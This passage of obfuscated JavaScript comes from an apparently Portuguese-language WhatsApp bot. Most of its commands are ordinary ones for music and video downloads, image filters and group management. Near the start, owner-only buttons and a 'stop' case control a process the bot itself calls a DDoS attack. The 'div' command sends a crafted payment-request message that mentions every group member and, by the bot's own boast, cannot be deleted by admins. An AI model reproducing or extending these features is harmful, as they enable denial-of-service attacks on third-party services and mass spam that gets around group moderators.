                    id: _0x1d93be + "atack " + _0x15412d,
                    quick_reply: "kk"
                  };
                  const _0x3b5218 = {
                    display_text: "❌ PARAR ATACK ❌",
                    id: _0x1d93be + "stop",
                    quick_reply: "kk"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x1eb3c7,
                      footer: {
                        text: ""
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify(_0x454de2)
                        }, {
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify(_0x3b5218)
                        }]
                      }
                    }
                  }, {});
                }, 2010);
              }
              break;
            case "stop":
              if (!_0x2a5ff3) {
                return _0x403602("*[❗] SOMENTE O MEU DONO [❗]*");
              }
              if (scriptProcess) {
                scriptProcess.kill();
                _0x403602("Ataque DDoS parado com sucesso.");
                scriptProcess = null;
              } else {
                _0x403602("Não há nenhum ataque DDoS em execução no momento.");
              }
              break;
            case "tempemail":
            case "geraremail":
              try {
                const _0x51030b = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "Aguarde, gerando um email temporário."
                }, _0x51030b);
                const _0x118c9c = await fetch(SITE_JEFF_APIS + "/api/tempemail?apikey=" + _0x512d5e);
                const _0x4e0281 = await _0x118c9c.json();
                if (_0x4e0281.status) {
                  const _0x3901d4 = _0x4e0281.emailData.mailbox;
                  const _0x24d525 = _0x4e0281.emailData.token;
                  if (botoes_) {
                    const _0x220ad2 = {
                      text: "Seu email temporário é: " + _0x3901d4 + "\n\nVálido por: 20 Minutos\n\nDireito: 1 mensagem recebida\n\nAguardando mensagens recebidas..."
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        body: _0x220ad2,
                        footer: {
                          text: ""
                        },
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR EMAIL",
                              id: "sim",
                              copy_code: "" + _0x3901d4
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x1b61c1 = {
                      text: "Seu email temporário é: " + _0x3901d4 + "\n\nVálido por: 20 Minutos\n\nDireito: 1 mensagem recebida\n\nAguardando mensagens recebidas...",
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x1b61c1).then(() => {
                      _0x403602("" + _0x3901d4);
                    });
                  }
                  _0x26cdf4(_0x24d525, _0x4f1071, _0x263319);
                } else {
                  await _0x263319.sendMessage(_0x4f1071, {
                    text: "Ocorreu um erro ao gerar o email temporário."
                  });
                }
              } catch (_0x2f19a6) {
                _0x403602("Error, talvez a api caiu contate meu criador!");
              }
              break;
            case "spotify":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
                }
                const _0xdb760d = {
                  text: "🎶",
                  key: _0x302296.key
                };
                const _0x5bd38d = {
                  react: _0xdb760d
                };
                _0x263319.sendMessage(_0x4f1071, _0x5bd38d);
                const _0x126c45 = await fetchJson(SITE_JEFF_APIS + "/api/spotifysearch?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x393b9c = _0x126c45.resultado.map((_0x3c0d2a, _0x448f83) => ({
                  id: _0x1d93be + "spotfy_down " + _0x3c0d2a.link,
                  header: "Opção " + (_0x448f83 + 1),
                  title: "Artista: ➥ " + _0x3c0d2a.artists,
                  description: "Titulo: " + _0x3c0d2a.title + "\nTempo: " + _0x3c0d2a.duration
                }));
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "Escolha uma opção:"
                    },
                    footer: {
                      text: "Resultados da pesquisa"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "ÁUDIO",
                          sections: [{
                            title: "Resultados de Áudio",
                            rows: _0x393b9c
                          }]
                        })
                      }]
                    }
                  }
                }, {});
              } catch (_0x479552) {
                console.error(_0x479552);
              }
              break;
            case "spotfy_down":
              try {
                _0x403602(enviar.espere);
                _0x263319.sendMessage(_0x4f1071, {
                  video: {
                    url: SITE_JEFF_APIS + "/api/spotifydow?link=" + _0x1d6557 + "&apikey=-" + _0x512d5e
                  },
                  mimetype: "audio/mpeg"
                }).catch(_0x1eac51 => {
                  return _0x403602(String(_0x1eac51));
                });
              } catch (_0x13bb82) {
                const _0x4afcf9 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x3264f1 = {
                  react: _0x4afcf9
                };
                _0x263319.sendMessage(_0x4f1071, _0x3264f1);
                return _0x403602("" + infoerror);
              }
              break;
            case "token_mp":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              let _0x4bef34 = _0x1d6557;
              necess.KEY_MERCADO_PAGO = _0x4bef34;
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(necess, null, 2));
              _0x403602("*Token do mercado pago (PIX) alterado com sucesso para:*\n\n " + _0x4bef34);
              break;
            case "videohd":
            case "videohd2":
            case "vhd":
              try {
                if (_0x5760e9 || _0x13c612 && _0x302296.message.videoMessage) {
                  let _0x5df883 = _0x5760e9 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.videoMessage : _0x302296.message.videoMessage;
                  if (_0x5df883.seconds > 30) {
                    _0x403602("☝️🤓 O vídeo deve ter no máximo 30 segundos.");
                  } else {
                    const _0x544c4b = "video";
                    const _0x1753c1 = await downloadContentFromMessage(_0x5df883, _0x544c4b);
                    let _0x923b71 = Buffer.from([]);
                    for await (const _0x37f92b of _0x1753c1) {
                      _0x923b71 = Buffer.concat([_0x923b71, _0x37f92b]);
                    }
                    const _0x2820bb = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x3b0d05 = {
                      react: _0x2820bb
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3b0d05);
                    const _0x1b3871 = await upload(_0x923b71);
                    const _0x10887e = SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?video=" + _0x1b3871 + "&apikey=" + _0x512d5e;
                    const _0x4f9a87 = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x3a618e = {
                      react: _0x4f9a87
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3a618e);
                    const _0x3ace34 = {
                      url: _0x10887e
                    };
                    const _0x31d3cb = {
                      [_0x544c4b]: _0x3ace34
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x31d3cb);
                  }
                } else {
                  _0x403602("Selecione um vídeo para transformar em HD.");
                }
              } catch (_0xa2f06e) {
                _0x403602("Ocorreu um erro, talvez a API esteja offline ou houve um erro na API.");
                const _0xb3c255 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x23dc85 = {
                  react: _0xb3c255
                };
                _0x263319.sendMessage(_0x4f1071, _0x23dc85);
              }
              break;
            case "blur":
            case "gaussian":
            case "sharpen":
            case "convolution":
            case "invert":
            case "grayscale":
            case "sepia":
            case "opacity":
            case "fade":
            case "posterize":
            case "brightness":
            case "contrast":
            case "color":
            case "threshold":
            case "dither565":
            case "dither16":
            case "rotate":
            case "flip":
            case "mirror":
            case "crop":
            case "autocrop":
            case "contain":
            case "cover":
            case "resize":
            case "scaletofit":
            case "scale":
            case "pixelate":
            case "composite":
            case "blit":
            case "mask":
            case "emboss":
            case "edgedetect":
            case "normalize":
            case "desaturate":
            case "hue":
            case "tint":
            case "blend":
            case "mosaic":
            case "median":
            case "lighten":
            case "darken":
            case "gamma":
            case "vintage":
            case "kodachrome":
            case "technicolor":
            case "polaroid":
            case "togreyscale":
            case "tosepia":
            case "rainbow":
            case "purple":
            case "green":
            case "blue":
            case "red":
            case "solarize":
            case "tintblue":
            case "tintred":
            case "vibrance":
            case "lomo":
            case "clarity":
            case "sinCity":
            case "sunrise":
            case "crossprocess":
            case "orangepeel":
            case "love":
            case "grungy":
            case "jarques":
            case "pinhole":
            case "oldboot":
            case "glowsun":
            case "haze":
            case "negative":
            case "saturate":
            case "linearburn":
            case "lineardodge":
            case "huerotate":
            case "brightnessContrast":
            case "blendwithImage":
            case "tintwithalpha":
            case "vignette":
            case "noise":
            case "glitch":
            case "pixelsort":
            case "kaleidoscope":
            case "pixelize":
            case "asciiart":
            case "sphere":
            case "swirl":
            case "polaroidborder":
            case "hexagonpixelate":
            case "mosaic":
            case "watereffect":
            case "tvstatic":
            case "papercut":
            case "nightvision":
            case "sketch":
            case "hologram":
            case "oilPainting":
            case "filmgrain":
            case "neonglow":
            case "halftone":
            case "crystallize":
            case "heatmap":
            case "warp":
            case "crossprocess":
            case "comicbook":
            case "solarize":
            case "emboss":
            case "lensflare":
            case "toonify":
            case "neon":
            case "glitcheffect":
            case "vintage":
            case "bloom":
            case "motionblur":
            case "cartoon":
            case "tiltShift":
            case "chromaticaberration":
            case "oilpainting":
            case "cartooneffect":
            case "crosshatch":
            case "sobelEdgedetection":
            case "waterripple":
            case "swirl":
            case "frostedGlass":
            case "displacementMap":
            case "kaleidoscope":
            case "bloomeffect":
            case "heatmapeffect":
            case "pixelsort":
            case "glitchart":
            case "liquify":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x59343d = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x4bbc4d = await downloadContentFromMessage(_0x59343d, "image");
                  let _0x540d84 = Buffer.from([]);
                  for await (const _0x6cfcf4 of _0x4bbc4d) {
                    _0x540d84 = Buffer.concat([_0x540d84, _0x6cfcf4]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x19111e = await upload(_0x540d84);
                  const _0x46394a = SITE_JEFF_APIS + "/api/filtro/" + _0x3dec88 + "?img=" + _0x19111e + "&apikey=" + _0x512d5e;
                  const _0x3d662d = {
                    url: _0x46394a
                  };
                  const _0x51dc47 = {
                    image: _0x3d662d
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x51dc47);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x5d4dbc) {
                console.error("Erro:", _0x5d4dbc);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "add_dono_gp":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              let _0x1f77a5 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
              if (_0x1f77a5.donos.includes(_0x32e455) && !_0x2a5ff3) {
                return _0x403602("Apenas o dono podem utilizar este comando.");
              }
              try {
                if (!_0x1f77a5.protecaoAtivada) {
                  return _0x403602("O comando " + _0x1d93be + "add_dono_gp só pode ser usado quando a proteção está habilitada.");
                }
                if (!_0x1f77a5.donos.includes(_0x1dcf0a)) {
                  _0x1f77a5.donos.push(_0x1dcf0a);
                  salvarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json", _0x1f77a5);
                  _0x403602(" Usuário adicionado na lista de Adms permitidos promover / rebaixar");
                } else {
                  _0x403602("O remetente já está na lista de Adms permitidos promover / rebaixar");
                }
              } catch (_0x3058d5) {
                console.error("Erro ao adicionar dono do grupo:", _0x3058d5);
                _0x403602("Erro ao adicionar dono do grupo. Tente novamente mais tarde.");
              }
              break;
            case "lista_donos_gp":
            case "lista_donos":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              let _0x33d547 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
              if (!_0x33d547.donos || !_0x2a5ff3 || _0x33d547.donos.length === 0) {
                return _0x403602("Não há donos cadastrados no grupo.");
              }
              try {
                let _0x15f222 = _0x33d547.donos.map((_0x2236c7, _0x26051e) => "| " + (_0x26051e + 1) + "° @" + _0x2236c7.split("@")[0]).join("\n");
                _0x403602("*Lista de Donos do Grupo:*\n\n" + _0x15f222 + "\n\n*Total de Donos:* " + _0x33d547.donos.length);
              } catch (_0x13ed70) {
                console.error("Erro ao listar donos do grupo:", _0x13ed70);
                _0x403602("Erro ao listar donos do grupo. Tente novamente mais tarde.");
              }
              break;
            case "del_dono_gp":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              try {
                let _0x4d4792 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
                if (_0x4d4792.donos.includes(_0x32e455) && !_0x2a5ff3) {
                  return _0x403602("Apenas Dono podem utilizar este comando.");
                }
                if (!_0x4d4792.protecaoAtivada) {
                  return _0x403602("O comando del_dono_gp só pode ser usado quando a proteção está habilitada.");
                }
                const _0x3deeef = _0x4d4792.donos.indexOf(_0x1dcf0a);
                if (_0x3deeef !== -1) {
                  _0x4d4792.donos.splice(_0x3deeef, 1);
                  salvarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json", _0x4d4792);
                  _0x403602("Usuário Removido  da lista de Adms permitidos promover / rebaixar");
                } else {
                  _0x403602("O remetente Não está na lista de Adms permitidos promover / rebaixar");
                }
              } catch (_0x190148) {
                console.error("Erro ao remover dono do grupo:", _0x190148);
                _0x403602("Erro ao remover dono do grupo. Tente novamente mais tarde.");
              }
              break;
            case "alterar_protecao":
              if (!_0xd20756) {
                return _0x403602("Este comando só pode ser usado em grupos.");
              }
              if (!_0x2a5ff3) {
                return _0x403602("Somente o dono pode usar este comando.");
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Use 1 para ativar ou 0 para desativar os recursos de proteção.");
              }
              const _0x28ae8d = Number(_0x40e45c[0]) === 1;
              try {
                let _0x43fa8c;
                if (fs.existsSync("./DADOS/grupos/grupo_" + _0x4f1071 + ".json")) {
                  _0x43fa8c = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
                } else {
                  const _0x53169b = {
                    protecaoAtivada: false,
                    donos: []
                  };
                  _0x43fa8c = _0x53169b;
                }
                _0x43fa8c.protecaoAtivada = _0x28ae8d;
                if (_0x28ae8d) {
                  if (!_0x43fa8c.donos.includes(_0x2dd81a)) {
                    _0x43fa8c.donos.push(_0x2dd81a);
                  }
                  if (!_0x43fa8c.donos.includes(_0x32e455)) {
                    _0x43fa8c.donos.push(_0x32e455);
                  }
                  _0x403602("Anti proteção de alteração ativado com sucesso para este grupo.✅\n\nUse " + _0x1d93be + "add_dono_gp para da permissão o usuário (SO ADM) para promover / rebaixar");
                } else {
                  _0x403602("Anti proteção de alteração desativado com sucesso para este grupo.❌\n\nUse " + _0x1d93be + "del_dono_gp para remover a permissão do usuário (SO ADM) para promover / rebaixar");
                }
                salvarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json", _0x43fa8c);
              } catch (_0x339fe8) {
                console.error("Erro ao alterar recursos de proteção:", _0x339fe8);
                _0x403602("Erro ao alterar recursos de proteção. Tente novamente mais tarde.");
              }
              break;
            case "div":
              if (!_0xd20756) {
                return _0x403602("Este comando só pode ser usado em grupos");
              }
              if (!_0x2a5ff3) {
                return _0x403602("Apenas o criador do bot pode usar este comando");
              }
              if (!_0x1d6557) {
                return _0x403602("cd o text, pode mandar que eu mando e marco geral e ainda nenhum adm consegue apagar hahahaah");
              }
              var _0x5f24f9 = _0x5b3ba6.map(_0x1d4f55 => _0x1d4f55.id);
              const _0xc4d38d = {
                mentionedJid: _0x5f24f9
              };
              const _0xb9c2e = {
                text: _0x1d6557,
                contextInfo: _0xc4d38d
              };
              const _0xca4979 = {
                extendedTextMessage: _0xb9c2e
              };
              const _0x1007c8 = {
                currencyCodeIso4217: "",
                amount1000: "1000",
                noteMessage: _0xca4979,
                expiryTimestamp: "0",
                amount: {}
              };
              _0x1007c8.amount.value = "1000";
              _0x1007c8.amount.offset = 1000;
              _0x1007c8.amount.currencyCode = "BRL";
              const _0x9c6ad1 = {
                requestPaymentMessage: _0x1007c8
              };
              const _0x113ed2 = _0x9c6ad1;
              const _0x15bf83 = {
                fromMe: false,
                remoteJid: _0x4f1071
              };
              const _0x2a69b7 = {
                key: _0x15bf83,
                message: _0x113ed2
              };
              const _0x3c325d = _0x2a69b7;
              await _0x263319.relayMessage(_0x4f1071, _0x3c325d.message, {
                messageId: _0x3c325d.key.id
              });
              break;
            case "criarcmd":
            case "fazercmd":
            case "fazercase":
            case "criarcase":
              {
                if (!_0x1d6557) {
                  return _0x403602("Poe o nome do novo comamdo apos o comando");
                }
                const _0xf44834 = "" + _0x1d6557;
                const _0x4ea281 = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage;
                let _0x1c0984 = "";
                let _0x1258df = "";
                let _0xa10ace = "";
                if (_0x4ea281.imageMessage) {
                  _0x1258df = "image";
                  const _0x1e9012 = {
                    url: _0x4ea281.imageMessage.url,
                    mimetype: _0x4ea281.imageMessage.mimetype,
                    caption: _0x4ea281.imageMessage.caption,
                    height: _0x4ea281.imageMessage.height,
                    width: _0x4ea281.imageMessage.width
                  };
                  const _0x2bb05c = {
                    image: _0x1e9012
                  };
                  _0x1c0984 = _0x2bb05c;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.sendMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                } else if (_0x4ea281.stickerMessage) {
                  _0x1258df = "sticker";
                  const _0xb0d2e3 = {
                    url: _0x4ea281.stickerMessage.url,
                    fileEncSha256: _0x4ea281.stickerMessage.fileEncSha256,
                    mediaKey: _0x4ea281.stickerMessage.mediaKey,
                    mimetype: _0x4ea281.stickerMessage.mimetype,
                    directPath: _0x4ea281.stickerMessage.directPath,
                    fileLength: _0x4ea281.stickerMessage.fileLength,
                    mediaKeyTimestamp: _0x4ea281.stickerMessage.mediaKeyTimestamp,
                    isAnimated: _0x4ea281.stickerMessage.isAnimated,
                    stickerSentTs: _0x4ea281.stickerMessage.stickerSentTs,
                    isAvatar: _0x4ea281.stickerMessage.isAvatar
                  };
                  const _0x34354e = {
                    sticker: _0xb0d2e3
                  };
                  _0x1c0984 = _0x34354e;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.sendMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                } else if (_0x4ea281.interactiveMessage) {
                  _0x1258df = "interactive";
                  const _0x4ec9a3 = _0x4ea281.interactiveMessage;
                  const _0x10a02a = _0x4ec9a3.nativeFlowMessage && _0x4ec9a3.nativeFlowMessage.buttons ? _0x4ec9a3.nativeFlowMessage.buttons : [];
                  const _0x1a5db2 = _0x4ec9a3.body && _0x4ec9a3.body.text ? _0x4ec9a3.body.text : "";
                  const _0x26dd8e = _0x4ec9a3.footer && _0x4ec9a3.footer.text ? _0x4ec9a3.footer.text : "";
                  _0xa10ace = "case '" + _0xf44834 + "': {\nconn.relayMessage(from, {\ninteractiveMessage: {\n" + ("body: {\"text\": \"" + _0x1a5db2 + "\"\n},\n") + ("footer: {\"text\": \"" + _0x26dd8e + "\"\n},\n") + "nativeFlowMessage: {\nbuttons: [\n" + ("" + _0x10a02a.map(_0x386135 => "{\n" + ("name: \"" + _0x386135.name + "\",\n") + ("buttonParamsJson: " + JSON.stringify(_0x386135.buttonParamsJson) + "\n") + "}\n").join(",\n")) + "],\nmessageParamsJson: \"\"\n}\n}\n}, { quoted: info });\n}\nbreak;";
                } else if (_0x4ea281.conversation) {
                  _0x1258df = "text";
                  const _0x54d367 = {
                    text: _0x4ea281.conversation
                  };
                  _0x1c0984 = _0x54d367;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.sendMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                } else if (_0x4ea281.requestPaymentMessage) {
                  _0x1258df = "requestPayment";
                  _0xa10ace = "case '" + _0xf44834 + "': {\nconst paymentDetails = {\nrequestPaymentMessage: {\n" + ("currencyCodeIso4217: \"" + _0x4ea281.requestPaymentMessage.currencyCodeIso4217 + "\",\n") + ("amount1000: \"" + _0x4ea281.requestPaymentMessage.amount1000 + "\",\n") + "noteMessage: {\nextendedTextMessage: {\n" + ("text: \"" + _0x4ea281.requestPaymentMessage.noteMessage.extendedTextMessage.text + "\",\n") + "contextInfo: {\nmentionedJid: [sender]\n}\n}\n},\namount: {\n" + ("value: \"" + _0x4ea281.requestPaymentMessage.amount.value + "\",\n") + ("offset: " + _0x4ea281.requestPaymentMessage.amount.offset + ",\n") + ("currencyCode: \"" + _0x4ea281.requestPaymentMessage.amount.currencyCode + "\"\n") + "}\n}\n};\nconst relayMessage = {\nkey: {\nfromMe: false,\nremoteJid: from\n},\nmessage: paymentDetails\n};\nawait conn.relayMessage(from, relayMessage.message, { messageId: relayMessage.key.id });\n}\nbreak;";
                } else if (_0x4ea281.liveLocationMessage) {
                  _0x1258df = "liveLocationMessage";
                  const _0x4ae708 = _0x4ea281.liveLocationMessage;
                  const _0x42b112 = _0x4ae708.degreesLatitude;
                  const _0x10a788 = _0x4ae708.degreesLongitude;
                  const _0x2ef18b = _0x4ae708.caption;
                  const _0x48ae54 = {
                    degressLatitude: _0x42b112,
                    degressLongitude: _0x10a788,
                    caption: _0x2ef18b
                  };
                  const _0x19d304 = {
                    liveLocationMessage: _0x48ae54
                  };
                  _0x1c0984 = _0x19d304;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.relayMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                } else if (_0x4ea281.audioMessage) {
                  _0x1258df = "audioMessage";
                  const _0x7a86c9 = _0x4ea281.audioMessage;
                  const _0x4f037d = _0x7a86c9.url;
                  const _0x40cfd9 = _0x7a86c9.mimetype;
                  const _0x2d6960 = _0x7a86c9.fileSha256;
                  const _0x4ae7cf = _0x7a86c9.fileLength;
                  const _0x1eaae8 = _0x7a86c9.seconds;
                  const _0x308e58 = _0x7a86c9.ptt;
                  const _0x4f2218 = {
                    url: _0x4f037d,
                    mimetype: _0x40cfd9,
                    seconds: _0x1eaae8,
                    ptt: _0x308e58
                  };
                  const _0x54fb48 = {
                    audio: _0x4f2218
                  };
                  _0x1c0984 = _0x54fb48;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.sendMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                } else {
                  _0x1258df = "text";
                  const _0x5f577b = {
                    text: _0x4ea281.extendedTextMessage.text
                  };
                  _0x1c0984 = _0x5f577b;
                  _0xa10ace = "case '" + _0xf44834 + "': {\n" + ("conn.sendMessage(from, " + JSON.stringify(_0x1c0984) + ");\n") + "}\nbreak;";
                }
                _0x403602(_0xa10ace);
                if (_0x2a5ff3) {
                  setTimeout(() => {
                    const _0x51004c = {
                      text: "☝️🤓 Ola *" + NickDono + "* Quer adicionar a case *" + _0x1d6557 + "* no *" + NomeDoBot + "* ?"
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        body: _0x51004c,
                        footer: {
                          text: ""
                        },
                        nativeFlowMessage: {
                          buttons: [{
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                              display_text: "ADICIONAR COMANDO",
                              id: _0x1d93be + "addcase " + _0xa10ace,
                              quick_reply: ""
                            })
                          }]
                        }
                      }
                    }, {});
                  }, 3000);
                }
              }
              break;
            case "yy":
              const _0x26a00b = _0x40e45c.join(" ");
              if (!_0x26a00b) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              const _0x54abe0 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x4142da = {
                react: _0x54abe0
              };
              _0x263319.sendMessage(_0x4f1071, _0x4142da);
              try {
                const _0x333a16 = await fetchJson(SITE_JEFF_APIS + "/api/play_audio?nome_link=" + _0x26a00b + "&apikey=" + _0x512d5e);
                if (!_0x333a16 || !_0x333a16.resultado || !_0x333a16.resultado.length) {
                  const _0x2ff166 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x685e40 = {
                    react: _0x2ff166
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x685e40);
                  return _0x403602("Desculpe por não conseguir encontrar a música. Por favor, forneça mais detalhes sobre ela.");
                }
                const _0x446dde = _0x333a16.resultado[0];
                const _0x320d8f = "`";
                const _0x2ff99f = "\n      🎶 *PLAY MUSIC* 🎶\n      \n• *Título:* " + _0x320d8f + _0x446dde.titulo + _0x320d8f + "\n• *Canal:* " + _0x320d8f + _0x446dde.canal + _0x320d8f + "\n• *Duração:* " + _0x320d8f + _0x446dde.tempo + _0x320d8f + "\n• *Views:* " + _0x320d8f + _0x446dde.views + _0x320d8f + "\n• *Publicado:* " + _0x320d8f + _0x446dde.publicado + _0x320d8f + "\n─────────────────\n\n> 📥 𝘙𝘦𝘢𝘭𝘪𝘻𝘢𝘯𝘥𝘰 𝘰 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥...\n    ";
                const _0x210690 = {
                  url: _0x446dde.thumbnail
                };
                const _0x2b099e = {
                  image: _0x210690,
                  caption: _0x2ff99f
                };
                await _0x263319.sendMessage(_0x4f1071, _0x2b099e);
                const _0x57680e = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x517174 = {
                  react: _0x57680e
                };
                _0x263319.sendMessage(_0x4f1071, _0x517174);
                const _0x4509e = {
                  url: _0x446dde.download_mp3
                };
                const _0x2ed4bb = {
                  audio: _0x4509e,
                  mimetype: "audio/mpeg"
                };
                const _0x4f893a = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x2ed4bb, _0x4f893a);
              } catch (_0x12e0d0) {
                const _0x59d60b = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x4bc7d2 = {
                  react: _0x59d60b
                };
                _0x263319.sendMessage(_0x4f1071, _0x4bc7d2);
                return _0x403602("Erro api talvez esteja offline. Tente novamente mais tarde.");
              }
              break;
            case "yyv":
              const _0x6d9e7a = _0x40e45c.join(" ");
              if (!_0x6d9e7a) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              const _0x1292e8 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x5309c2 = {
                react: _0x1292e8
              };
              _0x263319.sendMessage(_0x4f1071, _0x5309c2);
              try {
                const _0x17da95 = await fetchJson(SITE_JEFF_APIS + "/api/play_video?nome_link=" + _0x6d9e7a + "&apikey=" + _0x512d5e);
                if (!_0x17da95 || !_0x17da95.resultado || !_0x17da95.resultado.length) {
                  const _0x22996f = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x584b4a = {
                    react: _0x22996f
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x584b4a);
                  return _0x403602("Desculpe por não conseguir encontrar a música. Por favor, forneça mais detalhes sobre ela.");
                }
                const _0x286077 = _0x17da95.resultado[0];
                const _0x51e7e5 = "`";
                const _0xe0a3ae = "\n      🎶 *PLAY VIDEO* 🎶\n      \n• *Título:* " + _0x51e7e5 + _0x286077.titulo + _0x51e7e5 + "\n• *Canal:* " + _0x51e7e5 + _0x286077.canal + _0x51e7e5 + "\n• *Duração:* " + _0x51e7e5 + _0x286077.tempo + _0x51e7e5 + "\n• *Views:* " + _0x51e7e5 + _0x286077.views + _0x51e7e5 + "\n• *Publicado:* " + _0x51e7e5 + _0x286077.publicado + _0x51e7e5 + "\n─────────────────\n\n> 📥 𝘙𝘦𝘢𝘭𝘪𝘻𝘢𝘯𝘥𝘰 𝘰 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥...\n    ";
                const _0x286fdf = {
                  url: _0x286077.thumbnail
                };
                const _0x3e29c5 = {
                  image: _0x286fdf,
                  caption: _0xe0a3ae
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3e29c5);
                const _0x3624e0 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x489397 = {
                  react: _0x3624e0
                };
                _0x263319.sendMessage(_0x4f1071, _0x489397);
                const _0x187ea = {
                  url: _0x286077.download_mp4
                };
                const _0xc12a24 = {
                  video: _0x187ea,
                  mimetype: "video/mp4"
                };
                const _0x2c5fea = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0xc12a24, _0x2c5fea);
              } catch (_0xd40f9b) {
                const _0x1b928e = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x25fc47 = {
                  react: _0x1b928e
                };
                _0x263319.sendMessage(_0x4f1071, _0x25fc47);
                return _0x403602("Erro api talvez esteja offline. Tente novamente mais tarde.");
              }
              break;
            case "spotifyplaylist":
            case "spotifyp":
              {
                if (!_0x1d6557) {
                  return _0x263319.sendMessage(_0x4f1071, {
                    text: "Por favor, envie o link da playlist do Spotify."
                  });
                }
                const {
                  handleSpotifyPlaylist: _0x47aec6
                } = require("./lib/spotifyplaylist");
                _0x4eb57a("⏳");
                try {
                  await _0x47aec6(_0x1d6557, _0x263319, _0x4f1071, enviar, _0x302296);
                  const _0x4ee330 = {
                    text: "✅",
                    key: _0x302296.key
                  };
                  const _0x4315c9 = {
                    react: _0x4ee330
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x4315c9);
                } catch (_0x529385) {
                  console.error("Erro ao processar a playlist Spotify:", _0x529385.message);
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "Erro ao processar a playlist do Spotify. Tente novamente mais tarde. 😐"
                  });
                }
              }
              break;
            case "insta_story":
              const _0x2473a4 = _0x40e45c.join(" ");
              if (!_0x2473a4 || !_0x2473a4.includes("instagram.com/stories") && !_0x2473a4.includes("@")) {
                const _0x2778e6 = {
                  text: "🤔",
                  key: _0x302296.key
                };
                const _0x27946e = {
                  react: _0x2778e6
                };
